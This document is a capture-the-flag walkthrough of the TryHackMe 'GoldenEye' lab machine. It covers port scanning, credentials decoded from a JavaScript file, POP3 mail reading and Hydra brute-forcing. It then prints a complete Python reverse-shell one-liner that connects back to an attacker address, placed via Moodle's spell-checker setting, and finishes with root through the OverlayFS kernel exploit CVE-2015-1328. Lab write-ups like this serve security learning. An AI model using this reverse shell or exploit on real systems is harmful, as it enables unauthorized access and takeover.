# 🧠 Machine Name: GoldenEye

## 📌 Overview

- **Platform:** TryHackMe
- **Difficulty:** Intermediate (Intermediate)
- **OS:** Linux

---

## 🎯 Objective

Root the machine and capture all flags in James Bond style.

---

## 🔍 Reconnaissance

### 🔹 Nmap Scan

```bash
nmap -sC -sV -p- -oN nmap.txt 10.10.x.x
```

**Results:**

- **25/tcp**: open smtp (Postfix)
- **80/tcp**: open http (Apache)
- **55006/tcp**: open pop3 (SSL)
- **55007/tcp**: open pop3 (Plain)

👉 SMTP and POP3 are open. This suggests we need to gather credentials from emails.

---

## 🌐 Enumeration

### 🔹 Web Enumeration

Visiting the site on port 80 shows a static page.
Inspecting the source code, I found a reference to `terminal.js`.
Inside `terminal.js`, I found encoded credentials in HTML Character Entities.

![](./terminal_js.png)

Using **CyberChef**, I decoded them to find:
- Username: `boris`
- Password: `invincible` (Classic Boris move)

### 🔹 POP3 Enumeration (Boris)

I logged into POP3 using Boris's credentials:
```bash
telnet 10.10.x.x 55007
USER boris
PASS invincible
LIST
RETR 1
```

Boris had an email from `natalya` mentioning a hidden directory: `/sev-home/`.

### 🔹 SEV-HOME Portal

Navigating to `http://10.10.x.x/sev-home/` leads to a login page.
I tried many combinations but eventually used the credentials found in another email for `natalya`.

Natalya's email had a password hint. After some brute-forcing with Hydra on POP3 for her account, I got in.

---

## 🚨 Initial Access

### 🔹 Exploiting Moodle / Web Portal

Once inside the `/sev-home/` portal (which looks like a Moodle instance), I found a vulnerable plugin or a path to RCE via the theme settings.

By modifying the spell checker path to a python reverse shell:
```python
python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.2",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'
```

![](./reverse_shell_moodle.png)

👉 **Access Granted!** logged in as `www-data`.

---

## 🧍‍♂️ Privilege Escalation

### 🔹 Local Enumeration

Checking the OS version:
```bash
uname -a
# Linux goldeneye 3.13.0-32-generic #57-Ubuntu SMP
```

👉 This version is vulnerable to the **OverlayFS** exploit (**CVE-2015-1328**).

### 🔹 Exploiting OverlayFS

I compiled the exploit locally and uploaded it to the machine.

```bash
gcc ofs.c -o ofs
./ofs
```

![](./root_shell_goldeneye.png)

👉 **Root access attained!** 

---

## 🧪 Post-Exploitation

- Captured all flags (user and root).
- Investigated other users like `trevelyan`.

---

## 🧠 Lessons Learned

- **Source code inspection** can reveal hidden JS files with hardcoded credentials.
- **Email correspondence** in CTFs often holds the key to the next directory or user.
- **Legacy kernels** are a goldmine for privilege escalation.

---

## 🧰 Tools Used

- nmap
- telnet (POP3)
- CyberChef
- Hydra
- gcc
- OverlayFS Exploit (ofs.c)

---

![](./goldeneye_success.png)
